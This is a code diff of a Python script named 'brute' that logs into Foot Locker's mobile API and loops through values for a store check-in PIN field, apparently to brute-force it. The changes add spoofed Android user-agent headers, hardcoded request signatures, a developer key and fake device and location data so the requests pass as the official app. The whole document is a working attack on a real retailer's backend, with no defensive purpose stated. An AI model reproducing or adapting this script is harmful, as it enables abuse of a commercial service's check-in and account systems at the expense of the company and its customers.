@@ -16,13 +16,14 @@ class brute:
         self.session = requests.session()
         self.session.headers = {
             'Host': 'pciis02.eastbay.com',
-            'Content-Type': 'application/json',
+            'Content-Type': 'application/json',#'application/binary',
+            'X-GPS-Signature' : 'Ab5PGHqXyC7AIxt4Nbn/AAGH5VBsTv5M6gxPYElr+zI=',
             'X-NewRelic-ID': 'VQMOWFZQGwsGVFBbBgI=',
             'Connection': 'keep-alive',
             'Accept': 'application/json',
             'Accept-Language': 'en-gb',
             'Accept-Encoding': 'gzip, deflate',
-            'User-Agent': 'footlocker/2064 CFNetwork/808.2.16 Darwin/16.3.0'}
+            'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; HUAWEI TIT-TL00 Build/KOT49H)'}
         self.username = username
         # password needs to be sent as md5
         m = hashlib.md5()
@@ -48,15 +49,16 @@ class brute:
         self.authkey = r.json()['authKey']
         self.jwt = r.json()['JWT']
         self.custId = r.json()['webCustomerId']
-        payload = [
-            {"dev_key": "wRcbEq7gD46s43QL1pPMt3HC", "app_version": "2.6.1", "longitude": "", "clienttype_id": 239,
-             "latitude": "", "sdk_version": "3.0", "release_id": 2503, "subpacket_type": 1, "dev_name": "Foot Locker",
-             "locationServices": "ON", "beacon_optin": "YES", "vip_status": "Regular VIP", "platform_id": 9,
-             "device_id": "", "refsrc": "", "os_version": "10.2", "packet_type": 9, "notification_optin": "YES"},
-            {"request_type": "register", "zipcode": "", "email": self.custId}]
-        payload = json.dumps(payload)
-        self.session.headers['Host'] = 'footlocker.gpshopper.com'
-        r = self.session.post('https://footlocker.gpshopper.com/mobile/239/9/2503/register', data=payload)
+        payload = '[{"platform_id":10,"release_id":4600,"packet_type":9,"subpacket_type":1,"encrypted":"true","os_version":"4.4.2","latitude":-33.8688183,"longitude":151.20929,"app_version":"2.8.0","sdk_version":"4.6.1","dev_key":"wRcbEq7gD46s43QL1pPMt3HC","clienttype_id":239,"dev_name":"Foot Locker","device_id":"5af786d1-5984-40f0-95db-6961e2a7fb8c"},{"email":"104756850","zipcode":"USEGPS","request_type":"register"}]'
+        #payload = json.dumps(payload)
+        self.session.headers={'Host' : 'footlocker.gpshopper.com',
+                              'User-Agent' : 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; HUAWEI TIT-TL00 Build/KOT49H)',
+                              'Accept-Encoding' : 'gzip, deflate',
+                              'Connection' : 'keep-alive',
+                              'Accept': '*/*',
+                              'X-GPS-Signature' : 'oLox0hVAUOiU9sxExZx2tzMvMUiAkX2VKQ+eUxUUpS0=',
+                              'Content-Type' : 'application/binary'}
+        r = self.session.post('https://footlocker.gpshopper.com/mobile', data=payload)
         if r.status_code == 200:
             print 'Register success'
         else:
@@ -83,27 +85,11 @@ class brute:
         for t in threads:
             t.start()
 
-    def test(self, lst):
-        if not self.loggedIn:
-            print 'Not authenticated'
-            return
-        key = lst[0]
-        payload = [
-            {"dev_key": "wRcbEq7gD46s43QL1pPMt3HC", "app_version": "2.6.1", "longitude": "", "clienttype_id": 239,
-             "latitude": "", "sdk_version": "3.0", "release_id": 2503, "subpacket_type": 1, "dev_name": "Foot Locker",
-             "locationServices": "ON", "beacon_optin": "YES", "vip_status": "Regular VIP", "platform_id": 9,
-             "device_id": "", "refsrc": "", "os_version": "10.2", "packet_type": 9, "notification_optin": "YES"},
-            {"request_type": "profile_save",
-             "supplemental_data": {"vip_status": "Regular VIP", "store_checkin_pin": str(key)}}]
-        payload = json.dumps(payload)
-        r = self.session.post('https://footlocker.gpshopper.com/mobile/239/9/2503/profile_save', data=payload)
-        print r.json()
-        print r.status_code
-
     def go(self, lst):
         if not self.loggedIn:
             print 'Not authenticated'
             return
+        print 'Task is running bruteforce (THIS COULD TAKE A WHILE BE PATIENT)'
         for key in lst:
             payload = [
                 {"dev_key": "wRcbEq7gD46s43QL1pPMt3HC", "app_version": "2.6.1", "longitude": "", "clienttype_id": 239,
@@ -118,11 +104,10 @@ class brute:
             if not r.status_code == 200:
                 print r.text
                 print str(key) + ' failed [%s' % r.status_code + ']'
-        print 'Thread: Done'
+        print 'Thread: Done (LOG OUT AND BACK INTO YOUR ACCOUNT)'
 
 
-username = raw_input("Email: ")
+username = raw_input("Username: ")
 password = raw_input("Password: ")
 b = brute(username, password)
 b.bruteForce()
-
